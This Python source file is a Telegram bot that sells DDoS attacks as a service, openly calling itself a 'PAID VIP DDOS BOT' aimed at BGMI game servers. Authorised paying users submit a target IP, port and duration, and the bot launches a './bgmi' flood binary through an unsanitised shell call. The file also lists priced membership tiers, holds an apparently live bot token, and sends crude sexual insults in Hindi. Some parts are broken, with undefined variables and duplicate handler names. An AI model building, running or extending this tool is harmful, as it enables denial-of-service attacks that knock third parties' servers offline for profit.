import telebot
import subprocess
import datetime
import os
#from flask import Flask

# insert your Telegram bot token here
bot = telebot.TeleBot('7299648603:AAHYbK4UU2wUh-5K2G8fX5gpavoIRCJsQH4')

# Admin user IDs
admin_id = ["6312238286","6312238286"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["6312238286"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝙇𝙤𝙜𝙨 𝙘𝙡𝙚𝙖𝙧𝙚𝙙 𝙉𝙤 𝙙𝙖𝙩𝙖 𝙁𝙤𝙪𝙣𝙙 ❌."
            else:
                file.truncate(0)
                response = "𝙇𝙤𝙜𝙨 𝙘𝙡𝙚𝙖𝙧𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 ✅"
    except FileNotFoundError:
        response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙"
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙙𝙪𝙧𝙖𝙩𝙞𝙤𝙣 𝙛𝙤𝙧𝙢𝙖𝙩𝙚"
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} 𝘼𝙙𝙙𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 {duration} {time_unit}\n𝘼𝙘𝙘𝙚𝙨𝙨 𝙚𝙭𝙥𝙞𝙧𝙚𝙨 𝙤𝙣 {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍"
                else:
                    response = "𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙨𝙚𝙩 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙙𝙖𝙩𝙚 . 𝙋𝙡𝙚𝙖𝙨𝙚 𝙩𝙧𝙮 𝙖𝙜𝙖𝙞𝙣 𝙡𝙖𝙩𝙚𝙧"
            else:
                response = "𝙐𝙨𝙚𝙧 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙚𝙭𝙞𝙨𝙩𝙨"
        else:
            response = "𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙥𝙚𝙘𝙞𝙛𝙮 𝙪𝙨𝙚𝙧 𝙞𝙙 𝙖𝙣𝙙 𝙙𝙪𝙧𝙖𝙩𝙞𝙤𝙣"
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 𝙔𝙊𝙐𝙍 𝙄𝙉𝙁𝙊\n\n🆔 𝙐𝙨𝙚𝙧 𝙞𝙙: <code>{user_id}</code>\n📝 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: {username}\n🔖 𝙍𝙤𝙡𝙚: {user_role}\n📅 𝙀𝙭𝙥𝙞𝙧𝙚 𝙙𝙖𝙩𝙚: {user_approval_expiry.get(user_id, 'Not Approved')}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝙐𝙨𝙚𝙧 {user_to_remove} 𝙍𝙚𝙢𝙤𝙫𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 👍."
            else:
                response = f"𝙐𝙨𝙚𝙧 {user_to_remove} 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙 𝙞𝙣 𝙡𝙞𝙨𝙩 ❌."
        else:
            response = '''𝙋𝙡𝙚𝙖𝙨𝙚 𝙨𝙥𝙖𝙘𝙞𝙛𝙮 𝙪𝙨𝙚𝙧 𝙞𝙙 𝙩𝙤 𝙧𝙚𝙢𝙤𝙫𝙚'''
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙩 ❌."
                else:
                    file.truncate(0)
                    response = "𝙇𝙤𝙜𝙨 𝙘𝙡𝙚𝙖𝙧𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 ✅"
        except FileNotFoundError:
            response = "𝙉𝙤 𝙡𝙤𝙜𝙨 𝙛𝙤𝙪𝙣𝙙 ❌."
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌."
                else:
                    file.truncate(0)
                    response = "𝙐𝙨𝙚𝙧 𝙘𝙡𝙚𝙖𝙧𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 ✅"
        except FileNotFoundError:
            response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌."
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "𝘼𝙡𝙡 𝙐𝙨𝙚𝙧𝙨:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌"
        except FileNotFoundError:
            response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌"
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌."
                bot.reply_to(message, response)
        else:
            response = "𝙉𝙤 𝙙𝙖𝙩𝙖 𝙛𝙤𝙪𝙣𝙙 ❌"
            bot.reply_to(message, response)
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🚀 BGMI KI MA CHUD GAYI HAI 🥵 JALDI SE FEEDBACK DO @SHADOW_OFFICIAL11🚀\n\n𝙏𝙖𝙧𝙜𝙚𝙩: {target}\n𝙏𝙞𝙢𝙚: {time} 𝙎𝙚𝙘𝙤𝙣𝙙𝙨\n𝘼𝙩𝙩𝙖𝙘𝙠𝙚𝙧 𝙣𝙖𝙢𝙚: @{username}"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['jonysins'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝙔𝙤𝙪𝙧 𝙖𝙧𝙚 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙬𝙖𝙞𝙩 300 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙩𝙤 𝙪𝙨𝙚 𝙖𝙜𝙖𝙞𝙣"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 120:
                response = "GAND DEGA KYA ITNA JADA SECOND LAGA KE 120 SEC LAGA "
            else:
                record_command_logs(user_id, '/jonysins', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time}"
                process = subprocess.run(full_command, shell=True)
                response = f"[𝘼𝙩𝙩𝙖𝙘𝙠 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙] 😈BAHAN KE LODE FEEDBACK DEDE AB KYA MA CHUDATA RAHEGA ATTACK LAGA LAGA KE 😈"
                #bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙥𝙧𝙤𝙫𝙞𝙙𝙚 <𝙄𝙋> <𝙋𝙊𝙍𝙏> <𝙏𝙄𝙈𝙀> 😈ANDI MANDI SANDI JO FEEDBACK NA DE OSKI MA RANDI 😈 SEND A FEEDBACK @SHADOW_OFFICIAL11"  # Updated command syntax
    else:
        response = ("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨! 🚫\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ 𝙉𝙤 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙡𝙤𝙜𝙨 𝙛𝙤𝙪𝙣𝙙 ❌."
        except FileNotFoundError:
            response = "𝙉𝙤 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙡𝙤𝙜𝙨 𝙛𝙤𝙪𝙣𝙙"
    else:
        response = "🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨! 🚫\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!"


@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🔰 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙋AID VIP 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏 🔰'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['membership'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝙃𝙀𝙍𝙀 𝙄𝙎 𝙏𝙃𝙀 𝙑𝙄𝙋 𝙋𝙇𝘼𝙉𝙎:

💰 𝗩𝗜𝗣 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣𝗦 💰


   🆓 FREE [CURRENTLY NOT AVAILABLE]
    [180 SEC ATK]
    [600 SEC COOLDOWN]


   ➡️ PREMIUM
    [240 SEC ATK]
    [300 SEC COOLDOWN]


   ➡️ PLATINUM
    [300 SEC ATK]
    [NO COOLDOWN]
    [CUSTOMIZATION]
        
    💰 𝗣𝗥𝗜𝗖𝗘 💰
    
   ➡️ PREMIUM
  [1DAY  - 120]
  [WEEK  - 600]
  [MONTH - 1800]


   ➡️ PLATINUM
  [SEASON 2500 INR]
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
💥 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "𝙈𝙀𝙎𝙎𝘼𝙂𝙀 𝙁𝙍𝙊𝙈 𝘼𝘿𝙈𝙄𝙉\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙨𝙚𝙣𝙙 {user_id}: {str(e)}")
            response = "𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙨𝙚𝙣𝙩 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 👍."
        else:
            response = "𝙥𝙧𝙤𝙫𝙞𝙙𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙨𝙚𝙣𝙙."
    else:
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"

    bot.reply_to(message, response)


@bot.message_handler(commands=['check'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''𝗡𝗼𝘄 𝗦𝘁𝗮𝗿𝘁 𝘁𝗵𝗲 𝗺𝗮𝘁𝗰𝗵
'''


    bot.reply_to(message, response)




#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)

